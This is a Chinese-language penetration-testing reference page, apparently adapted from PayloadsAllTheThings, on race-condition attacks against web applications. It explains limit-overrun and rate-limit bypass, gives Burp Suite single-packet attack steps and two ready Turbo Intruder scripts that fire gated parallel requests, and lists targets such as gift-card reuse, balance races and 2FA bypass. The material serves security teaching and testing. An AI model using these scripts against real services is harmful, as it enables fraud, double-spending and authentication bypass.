# Race Condition - 竞争条件

[SEARCH_KEYWORDS]
漏洞类型: Race Condition 竞争条件 并发漏洞 Time-of-check Time-of-use
攻击类型: Limit Overrun Rate Limit Bypass Double Spend Multiple Redemption
关键词: concurrent parallel thread synchronization TOCTOU
技术: HTTP/2 Single-packet Last-byte Sync Turbo Intruder
工具: turbo-intruder Raceocat h2spacex

[CONTENT]

## 竞争条件概述

当进程关键性地或意外地依赖于其他事件的顺序或时间时，可能发生竞争条件。在Web环境中，多个请求可以同时处理，开发者可能将并发处理留给框架、服务器或编程语言。

## 攻击类型

### Limit-overrun (限制绕过)

多线程竞争更新或访问共享资源，导致资源超过预期限制。

**示例**：
- 超额提款
- 多次投票
- 多次使用礼品卡

### Rate-limit Bypass (速率限制绕过)

利用速率限制机制缺乏适当同步来超过预期请求限制。

**示例**：
- 绕过暴力破解防护
- 绕过2FA

## 攻击技术

### HTTP/1.1 Last-byte同步

发送除最后一个字节外的所有请求，然后"释放"每个请求：

```python
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```

### HTTP/2 Single-packet攻击

HTTP/2可在单个连接上并发发送多个请求。约20-30个请求会同时到达服务器，消除网络抖动。

**Burp Suite步骤**：
1. 发送请求到Repeater
2. 复制请求20次 (CTRL+R)
3. 创建组并添加所有请求
4. 并行发送组 (single-packet attack)

## Turbo Intruder脚本

### 基础脚本

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.start(timeout=5)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

### 多端点脚本

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100)
    request1 = '''POST /target-URI-1 HTTP/1.1
Host: target.com
Cookie: session=xxx

parameterName=value'''

    request2 = '''GET /target-URI-2 HTTP/1.1
Host: target.com
Cookie: session=xxx'''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

## 常见目标

- 优惠券/礼品卡多次使用
- 限额绕过
- 投票多次计数
- 账户余额竞争
- 文件上传竞争
- 认证绕过

## 工具

- turbo-intruder - Burp扩展，发送大量HTTP请求
- Raceocat - 高效利用竞争条件
- h2spacex - HTTP/2单包攻击工具

## 参考文档

原始来源: PayloadsAllTheThings/Race Condition/README.md